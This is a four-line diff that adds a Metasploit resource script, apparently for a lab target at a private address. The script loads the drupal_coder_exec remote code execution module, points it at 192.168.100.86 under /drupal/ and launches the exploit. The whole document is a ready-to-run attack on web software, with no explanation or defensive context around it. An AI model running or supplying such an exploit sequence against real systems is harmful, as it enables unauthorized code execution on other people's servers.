@@ -1,0 +1,4 @@
+use exploit/unix/webapp/drupal_coder_exec
+set RHOSTS 192.168.100.86
+set TARGETURI /drupal/
+exploit
